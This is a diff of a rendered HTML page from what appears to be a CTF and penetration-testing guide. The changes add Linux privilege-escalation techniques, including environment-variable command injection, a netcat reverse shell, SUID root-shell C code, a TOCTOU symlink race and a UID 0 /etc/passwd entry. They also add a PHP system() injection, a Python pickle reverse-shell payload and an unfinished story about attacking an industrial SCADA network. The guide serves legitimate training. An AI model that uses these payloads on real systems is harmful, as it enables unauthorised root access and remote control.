@@ -32,6 +32,7 @@
     <script type="text/javascript" src="_static/jquery.js"></script>
     <script type="text/javascript" src="_static/underscore.js"></script>
     <script type="text/javascript" src="_static/doctools.js"></script>
+    <script type="text/javascript" src="_static/disqus.js"></script>
     <script type="text/javascript" src="_static/bizstyle.js"></script>
     <link rel="search" title="Search" href="search.html" />
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
@@ -165,9 +166,15 @@
 <li><a class="reference internal" href="#find-files-folder-owned-by-the-user">Find files/ folder owned by the user</a></li>
 </ul>
 </li>
+<li><a class="reference internal" href="#other-linux-privilege-escalation">Other Linux Privilege Escalation</a><ul>
 <li><a class="reference internal" href="#execution-of-binary-from-relative-location-than-absolute">Execution of binary from Relative location than Absolute</a></li>
-<li><a class="reference internal" href="#symlink-creation">Symlink Creation</a><ul>
+<li><a class="reference internal" href="#environment-variable-abuse">Environment Variable Abuse</a></li>
+<li><a class="reference internal" href="#world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab">World-Writable Folder with a Script executing any file in that folder using crontab</a></li>
+<li><a class="reference internal" href="#symlink-creation">Symlink Creation</a></li>
 <li><a class="reference internal" href="#directory-symlink">Directory Symlink</a></li>
+<li><a class="reference internal" href="#time-of-check-to-time-of-use">Time of check to time of use</a></li>
+<li><a class="reference internal" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">Writable /etc/passwd or account credentials came from a legacy unix system</a></li>
+<li><a class="reference internal" href="#elevating-privilege-from-a-suid-binary">Elevating privilege from a suid binary</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#mysql-privileged-escalation">MySQL Privileged Escalation</a><ul>
@@ -175,7 +182,6 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#cron-d">Cron.d</a></li>
-<li><a class="reference internal" href="#elevating-privilege-from-a-suid-binary">Elevating privilege from a suid binary</a></li>
 <li><a class="reference internal" href="#unattended-apt-upgrade">Unattended APT - Upgrade</a><ul>
 <li><a class="reference internal" href="#dpkg">DPKG</a></li>
 <li><a class="reference internal" href="#apt">APT</a></li>
@@ -1761,30 +1767,6 @@ find / -perm -o x -type f 2&gt;/dev/null     # world-executable files
 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders
 </pre></div>
 </div>
-<ul class="simple">
-<li>If the below files are world writable, we could do privilege escalation.</li>
-</ul>
-<blockquote>
-<div><ul class="simple">
-<li>/etc/passwd</li>
-</ul>
-<blockquote>
-<div><ul class="simple">
-<li>Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.</li>
-<li>For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.</li>
-<li>Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.</li>
-<li>If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>perl -le &#39;print crypt(&quot;foo&quot;, &quot;aa&quot;)&#39; to set the password to foo.
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>It’s possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That’s because it’s possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0</li>
-</ul>
-</div></blockquote>
-</div></blockquote>
 </div>
 <div class="section" id="any-problem-files">
 <h4>Any “problem” files?<a class="headerlink" href="#any-problem-files" title="Permalink to this headline">¶</a></h4>
@@ -1807,9 +1789,15 @@ find / -group groupname 2&gt; /dev/null
 </div>
 </div>
 </div>
+<div class="section" id="other-linux-privilege-escalation">
+<h3>Other Linux Privilege Escalation<a class="headerlink" href="#other-linux-privilege-escalation" title="Permalink to this headline">¶</a></h3>
 <div class="section" id="execution-of-binary-from-relative-location-than-absolute">
-<h3>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Permalink to this headline">¶</a></h3>
+<h4>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Permalink to this headline">¶</a></h4>
 <p>If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
+<p>Something like this:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>system(&quot;/usr/bin/env echo and now what?&quot;);
+</pre></div>
+</div>
 <p>so we can create a file in temp:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;/bin/sh&quot; &gt;&gt; /tmp/id
 chmod +x /tmp/id
@@ -1839,8 +1827,61 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 </div>
 <p>It is important to see .bash_profile file which contains the $PATH</p>
 </div>
+<div class="section" id="environment-variable-abuse">
+<h4>Environment Variable Abuse<a class="headerlink" href="#environment-variable-abuse" title="Permalink to this headline">¶</a></h4>
+<p>If the suid binary contains a code like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));
+printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);
+system(buffer);
+</pre></div>
+</div>
+<p>We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>USER=&quot;;/bin/sh;&quot;
+</pre></div>
+</div>
+<p>When the program is executed, USER variable will contain /bin/sh and will be executed on system call.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>echo $USER
+;/bin/sh;
+
+levelXX@:/home/flagXX$ ./flagXX
+about to call system(&quot;/bin/echo ;/bin/sh; is cool&quot;)
+
+sh-4.2$ id
+uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)
+</pre></div>
+</div>
+</div>
+<div class="section" id="world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab">
+<h4>World-Writable Folder with a Script executing any file in that folder using crontab<a class="headerlink" href="#world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab" title="Permalink to this headline">¶</a></h4>
+<p>If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>#!/bin/sh
+
+for i in /home/flagXX/writable.d/* ; do
+       (ulimit -t 5; bash -x &quot;$i&quot;)
+       rm -f &quot;$i&quot;
+done
+</pre></div>
+</div>
+<p>then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;/bin/nc.traditional -e /bin/sh 192.168.56.1 22&quot; &gt; hello.sh
+</pre></div>
+</div>
+<p>or</p>
+<p>we can create a suid file to give us the privileged user permission</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>#!/bin/sh
+gcc /var/tmp/shell.c -o /var/tmp/flagXX
+chmod 4777 /var/tmp/flagXX
+</pre></div>
+</div>
+<p>Considering shell.c contains</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>int main(void) {
+setgid(0); setuid(0);
+execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0); }
+</pre></div>
+</div>
+</div>
 <div class="section" id="symlink-creation">
-<h3>Symlink Creation<a class="headerlink" href="#symlink-creation" title="Permalink to this headline">¶</a></h3>
+<h4>Symlink Creation<a class="headerlink" href="#symlink-creation" title="Permalink to this headline">¶</a></h4>
 <p>Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let’s say there’s a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>ln -s /etc/shadow /home/xxxxxx/example.conf
 ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf
@@ -1850,6 +1891,7 @@ ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf
 <div class="highlight-None"><div class="highlight"><pre><span></span>readExampleConf /home/xxxxxxx/example.conf
 &lt;Contents of shadow or id_rsa&gt;
 </pre></div>
+</div>
 </div>
 <div class="section" id="directory-symlink">
 <h4>Directory Symlink<a class="headerlink" href="#directory-symlink" title="Permalink to this headline">¶</a></h4>
@@ -1870,6 +1912,77 @@ lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -&gt; /etc/
 </div>
 <p>This might be useful to bypass some filtering, when let’s say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup.</p>
 </div>
+<div class="section" id="time-of-check-to-time-of-use">
+<h4>Time of check to time of use<a class="headerlink" href="#time-of-check-to-time-of-use" title="Permalink to this headline">¶</a></h4>
+<p>In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and open to open a specific file), when used in a setuid program, has a TOCTTOU bug:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>if (access(&quot;file&quot;, W_OK) != 0) {
+  exit(1);
+}
+
+fd = open(&quot;file&quot;, O_WRONLY);
+//read over /etc/shadow
+read(fd, buffer, sizeof(buffer));
+</pre></div>
+</div>
+<p>Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:</p>
+<p>Attacker</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>//
+//
+// After the access check
+symlink(&quot;/etc/shadow&quot;, &quot;file&quot;);
+// Before the open, &quot;file&quot; points to the password database
+//
+//
+</pre></div>
+</div>
+<p>In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.</p>
+<p>Let’s see how we can exploit this?</p>
+<p>In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don’t have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flag10/token /tmp/token ; done
+</pre></div>
+</div>
+<p>We would also run the program in a while loop</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>while true; do ./flagXX /tmp/token 192.168.56.1 ; done
+</pre></div>
+</div>
+<p>Learning:</p>
+<p>Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.”</p>
+</div>
+<div class="section" id="writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">
+<h4>Writable /etc/passwd or account credentials came from a legacy unix system<a class="headerlink" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system" title="Permalink to this headline">¶</a></h4>
+<ul class="simple">
+<li>Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.</li>
+<li>For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.</li>
+<li>Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.</li>
+<li>If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>perl -le &#39;print crypt(&quot;foo&quot;, &quot;aa&quot;)&#39; to set the password to foo.
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>It’s possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That’s because it’s possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0</li>
+</ul>
+</div>
+<div class="section" id="elevating-privilege-from-a-suid-binary">
+<h4>Elevating privilege from a suid binary<a class="headerlink" href="#elevating-privilege-from-a-suid-binary" title="Permalink to this headline">¶</a></h4>
+<p>If we have ability to create a suid binary, we can use either</p>
+<p>Suid.c</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>int main(void) {
+setgid(0); setuid(0);
+execl(“/bin/sh”,”sh”,0); }
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>int main(void) {
+setgid(0); setuid(0);
+system(&quot;/bin/bash -p&quot;); }
+</pre></div>
+</div>
+<p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
+<p>More details can be found at <a class="reference external" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a></p>
+</div>
 </div>
 <div class="section" id="mysql-privileged-escalation">
 <h3>MySQL Privileged Escalation<a class="headerlink" href="#mysql-privileged-escalation" title="Permalink to this headline">¶</a></h3>
@@ -1889,24 +2002,6 @@ lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -&gt; /etc/
 <div class="section" id="cron-d">
 <h3>Cron.d<a class="headerlink" href="#cron-d" title="Permalink to this headline">¶</a></h3>
 <p>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>
-</div>
-<div class="section" id="elevating-privilege-from-a-suid-binary">
-<h3>Elevating privilege from a suid binary<a class="headerlink" href="#elevating-privilege-from-a-suid-binary" title="Permalink to this headline">¶</a></h3>
-<p>If we have ability to create a suid binary, we can use either</p>
-<p>Suid.c</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>int main(void) {
-setgid(0); setuid(0);
-execl(“/bin/sh”,”sh”,0); }
-</pre></div>
-</div>
-<p>or</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>int main(void) {
-setgid(0); setuid(0);
-system(&quot;/bin/bash -p&quot;); }
-</pre></div>
-</div>
-<p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
-<p>More details can be found at <a class="reference external" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a></p>
 </div>
 <div class="section" id="unattended-apt-upgrade">
 <h3>Unattended APT - Upgrade<a class="headerlink" href="#unattended-apt-upgrade" title="Permalink to this headline">¶</a></h3>
@@ -2617,9 +2712,16 @@ PasswordAuthentication yes
 </pre></div>
 </div>
 <p>and</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>proxychains4 remmina
+<div class="highlight-None"><div class="highlight"><pre><span></span>proxychains4 remmina/ rdesktop
 </pre></div>
 </div>
+<p>If we have to share a interesting story with you, Recently, We were assigned a engagment to compromise a industrial plant. Let us walkthru what’s the scenario.</p>
+<p>Scenario:</p>
+<ul class="simple">
+<li>Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)</li>
+<li>As it’s a industrial plant, there’s a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 – This is NATTed IP)</li>
+<li></li>
+</ul>
 </div>
 </div>
 <div class="section" id="http">
@@ -2732,12 +2834,21 @@ This makes all connections considered &quot;insecure&quot; fail unless -k, --ins
 </div>
 <div class="section" id="http-404-custom-page">
 <h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information store.d</p>
+<p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored</p>
 </div>
 <div class="section" id="id20">
 <h4>PHP<a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h4>
-<ul class="simple">
-<li>PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a></li>
+<ul>
+<li><p class="first">PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a> and <a class="reference external" href="http://www.madirish.net/402">Exploiting PHP PCRE Functions</a></p>
+</li>
+<li><p class="first">PHP has <a class="reference external" href="http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a> The Complex Syntax to allow evaluation of our own code in double quotes.</p>
+<p>Example</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>$use_me = &quot;ls -lah&quot;
+{${system($use_me)}}
+</pre></div>
+</div>
+<p>This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).</p>
+</li>
 </ul>
 </div>
 </div>
@@ -3473,8 +3584,29 @@ Also, it might be a good idea to test the command with ? on your local machine f
 </li>
 <li><p class="first">Sometimes, we don’t have tools on the victim machine, in that case we can download static binaries from <a class="reference external" href="https://github.com/andrew-d/static-binaries">Static-Binaries</a> If not, found, try the deb or rpm package of the binary, extract it and upload.</p>
 </li>
-<li><p class="first">Handy Stuff</p>
+<li><p class="first">If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>conn,addr = self.receiver_socket.accept()
+data = conn.recv(1024)
+return cPickle.loads(data)
+</pre></div>
+</div>
 </li>
+</ul>
+<blockquote>
+<div><p>we may use</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>class Shell_code(object):
+def __reduce__(self):
+        return (os.system,(&#39;/bin/bash -i &gt;&amp; /dev/tcp/&quot;Client IP&quot;/&quot;Listening PORT&quot; 0&gt;&amp;1&#39;,))
+shell = cPickle.dumps(Shell_code())
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((&#39;Server IP&#39;,&#39;Server PORT&#39;))
+client_socket.send(shell)
+</pre></div>
+</div>
+<p>Refer <a class="reference external" href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely</a></p>
+</div></blockquote>
+<ul class="simple">
+<li>Handy Stuff</li>
 </ul>
 <blockquote>
 <div><ul class="simple">
@@ -3986,7 +4118,7 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 <p class="first admonition-title">Tip</p>
 <p class="last">Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!</p>
 </div>
-</div>
+<div data-disqus-identifier="CTF Series : Vulnerable Machines" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
 </div>
 </div>
 </div>
